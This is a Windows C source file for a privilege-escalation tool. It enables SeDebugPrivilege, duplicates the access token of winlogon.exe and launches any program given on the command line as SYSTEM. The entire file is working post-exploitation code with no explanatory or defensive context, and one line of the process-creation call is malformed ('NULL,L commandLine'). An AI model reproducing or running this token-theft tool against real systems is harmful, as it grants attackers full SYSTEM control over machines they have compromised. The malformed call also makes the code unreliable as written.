#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

BOOL EnableDebugPriv() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed\n");
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[!] LookupPrivilegeValue failed\n");
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[!] AdjustTokenPrivileges failed\n");
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

DWORD GetPidByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, processName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main(int argc, char* argv[]) {
	if (!IsAdmin()) {
        printf("[!] This tool must be run as Administrator.\n");
        return 1;
    }
	
    if (argc < 2) {
        printf("Usage: %s <application_to_run> [args...]\n", argv[0]);
        return 1;
    }

    if (!EnableDebugPriv()) {
        printf("[!] Failed to enable SeDebugPrivilege\n");
        return 1;
    }

    DWORD pid = GetPidByName("winlogon.exe");
    if (!pid) {
        printf("[!] Failed to find winlogon.exe\n");
        return 1;
    }
    printf("[+] Found winlogon.exe PID: %d\n", pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid);
    if (!hProcess) {
        printf("[!] Failed to open winlogon.exe (LastError: %d)\n", GetLastError());
        return 1;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken failed (LastError: %d)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[!] DuplicateTokenEx failed (LastError: %d)\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    int i;
    size_t totalLen = 0;
    wchar_t* commandLine = NULL;

    for (i = 1; i < argc; i++) {
        totalLen += strlen(argv[i]) + 3;
    }

    commandLine = (wchar_t*)malloc((totalLen + 1) * sizeof(wchar_t));
    if (!commandLine) {
        printf("[!] Memory allocation failed\n");
        return 1;
    }
    commandLine[0] = L'\0';

    for (i = 1; i < argc; i++) {
        wchar_t wideArg[MAX_PATH];
        mbstowcs(wideArg, argv[i], MAX_PATH);
        wcscat(commandLine, L"\"");
        wcscat(commandLine, wideArg);
        wcscat(commandLine, L"\" ");
    }

    if (wcslen(commandLine) > 0) {
        commandLine[wcslen(commandLine) - 1] = L'\0';
    }

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION pi;

	if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, NULL,L commandLine, 0, NULL, NULL, &si, &pi)) {
		DWORD error = GetLastError();
		wprintf(L"[!] CreateProcessWithTokenW failed (LastError: %d)\n", error);
		free(commandLine);
		CloseHandle(hDupToken);
		CloseHandle(hToken);
		CloseHandle(hProcess);
		return 1;
	}

    printf("[+] Successfully created process as SYSTEM!\n");

    free(commandLine);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}